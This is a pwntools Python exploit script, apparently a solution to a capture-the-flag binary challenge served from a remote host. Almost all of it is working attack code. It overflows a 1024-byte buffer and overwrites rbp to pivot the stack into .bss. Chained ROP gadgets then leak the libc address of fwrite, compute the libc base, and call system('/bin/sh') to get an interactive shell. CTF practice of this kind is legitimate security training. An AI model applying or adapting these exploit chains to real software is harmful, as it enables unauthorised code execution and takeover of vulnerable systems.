from pwn import *
import sys

"""
idea:
change rbp to point to known memory,
call main again with rdi 1 (skip prologue?)
stdout is written to rbp+0x418

prepare the stack so that the stdout address is written right at the correct position into the overlayed ropchain.

0x7ffd56e99cc8 (_IO_2_1_stdout_)
0x7ffd56e9a0e8 rsp on ret (start of rop chain)
"""

context.update(arch='amd64', os='linux')
#context.update(log_level='debug')

CHALLENGE_BINARY = './chall10'
pop_rdi = 0x400d83
pop_rsi_r15 = 0x400d81
pop_rsp_3 = 0x400d7d
main = 0x400B26

new_rbp = 0x602c00

if len(sys.argv) > 1:
    r = remote('challenge.pwny.racing', 11534)
    r.libc = ELF('./libc-2.27.so')
else:
    r = process(CHALLENGE_BINARY)
chal = ELF(CHALLENGE_BINARY)

rop1 = ROP(chal, badchars='\n')
rop1.raw(new_rbp)
rop1.call(main + 4, [1]) # jump past the prologue of main (argc = 1). rbp points to our know address now
#print(rop1.dump())

log.info('Changing rbp to point into .bss 0x{:x}'.format(new_rbp))

r.recvuntil('file: ')
#gdb.attach(r)
r.sendline('a'*1024 + '\x10' + str(rop1))

# write the first part of our ropchain into the buffer
# right away at $rbp-0x410
rop4_pre = flat([
    pop_rdi,
])

# prepare $rbp for the next loop to be offset just right,
# so stdout is written after our pop_rdi gadget in the
# previous frame's buffer. There is a 8 byte gap on the stack
# of main between argc and the stream, which isn't touched
# by the function, so our pop_rdi gadget survives there.
rop2 = ROP(chal, badchars='\n')
rop2.raw(new_rbp+16)
rop2.call(main + 4, [1])

r.recvuntil('file: ')
r.sendline(rop4_pre.ljust(1024, 'a') + '\x10' + str(rop2))

buffer_addr = new_rbp - 0x410

# Now put the rest of the rop chain to leak a libc pointer
# in the buffer, which is right after the stdout pointer
# on the stack.
rop4_post = flat([
    pop_rsi_r15, chal.got['fwrite'], 0,
    chal.plt['fprintf'],
    pop_rdi, 1,
    main
])

# point $rsp to the start of our prepared rop chain
# starting at the first pop_rdi gadget we put there
# in the beginning.
rop3 = flat([
    new_rbp,
    pop_rsp_3, buffer_addr - 24
])

log.info('Leaking libc.')
r.recvuntil('file: ')
r.sendline(rop4_post.ljust(1024, 'a') + '\x10' + rop3)

# get the leak
r.recvline()
libc_fwrite = u64(r.recv(6).ljust(8, '\x00'))
log.info('Leaked fwrite: 0x{:x}'.format(libc_fwrite))
libc_base = libc_fwrite - r.libc.vaddr_to_offset(r.libc.symbols['fwrite'])
log.info('libc base: 0x{:x}'.format(libc_base))
r.libc.address = libc_base

# win
system = r.libc.symbols['system']
bin_sh = next(r.libc.search('/bin/sh\x00'))

ret = 0x4007be
rop5 = flat([
    ret,
    pop_rdi, bin_sh,
    system
])

r.recvuntil('file: ')
r.sendline('a' * 1024 + '\x18' + rop5)
r.interactive()